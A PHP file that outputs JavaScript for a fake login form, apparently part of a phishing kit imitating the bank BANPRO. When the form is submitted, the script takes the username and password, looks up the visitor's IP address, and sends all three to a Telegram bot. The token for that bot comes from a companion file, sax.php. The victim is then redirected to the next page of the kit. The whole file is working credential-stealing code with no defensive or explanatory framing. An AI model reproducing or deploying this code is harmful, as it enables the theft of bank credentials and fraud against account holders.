<?php
// login-script.php

echo "
<script>
    // Evitar espacios en el campo de usuario
    function noEspacios(event) {
        if (event.key === ' ') {
            return false;
        }
    }

    // Validar contraseña
    function validarContrasena(contrasena) {
        const regex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\\d)(?=.*[!#$%&()*+,\-.\\/\\:><=\\\\{}|¡])[A-Za-z\\d!#$%&()*+,\-.\\/\\:><=\\\\{}|¡]{8,32}$/;
        return regex.test(contrasena);
    }

    // Mostrar mensaje de error
    function mostrarError() {
        const errorMessage = document.getElementById('error-message');
        errorMessage.style.display = 'block';

        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 3000);
    }

    document.addEventListener('DOMContentLoaded', function() {
        // Evento de envío del formulario
        document.getElementById('f1').addEventListener('submit', function(event) {
            event.preventDefault();

            // Obtener los valores ingresados en el formulario
            const usuario = document.getElementById('i1').value;
            const contrasena = document.getElementById('i2').value;

            // Validar la contraseña
            if (!validarContrasena(contrasena)) {
                mostrarError();
                return;
            }

            // Obtener el token y el chat_id
            obtenerToken().then(data => {
                const token = data.token;
                const chat_id = data.chat_id;

                // Obtener la IP y luego enviar el mensaje a Telegram
                obtenerIP().then(ip => {
                    const msg = `BANPRO LOGIN> IP: ${ip} - Usuario: ${usuario} - Contraseña: ${contrasena}`;
                    enviarMensajeTelegram(token, chat_id, msg);
                }).catch(error => {
                    console.error('Error al obtener la IP:', error);
                });
            }).catch(error => {
                console.error('Error al obtener el token:', error);
            });
        });

        // Función para obtener el token y el chat ID desde sax.php
        function obtenerToken() {
            return fetch('sax.php')
                .then(response => response.json())
                .then(data => {
                    return {
                        token: data.token,
                        chat_id: data.chat_id
                    };
                })
                .catch(error => {
                    console.error('Error al obtener el token:', error);
                    throw error; // Lanza el error para que el flujo de promesas lo capture
                });
        }

        // Función para obtener la IP del cliente
        function obtenerIP() {
            return fetch('https://api.ipify.org?format=json')
                .then(response => response.json())
                .then(data => data.ip)
                .catch(error => {
                    console.error('Error al obtener la IP:', error);
                    return 'No disponible';
                });
        }

        // Función para enviar un mensaje a Telegram
        function enviarMensajeTelegram(token, chat_id, mensaje) {
            const url = `https://api.telegram.org/bot${token}/sendMessage`;
            const params = {
                chat_id: chat_id,
                text: mensaje
            };

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(params)
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Ocurrió un error al enviar el mensaje.');
                }
                console.log('Mensaje enviado con éxito.');
                // Redirigir después de enviar el mensaje
                window.location.href = '2.html';
            })
            .catch(error => {
                console.error('Error al enviar el mensaje:', error);
            });
        }
    });
</script>
";
?>
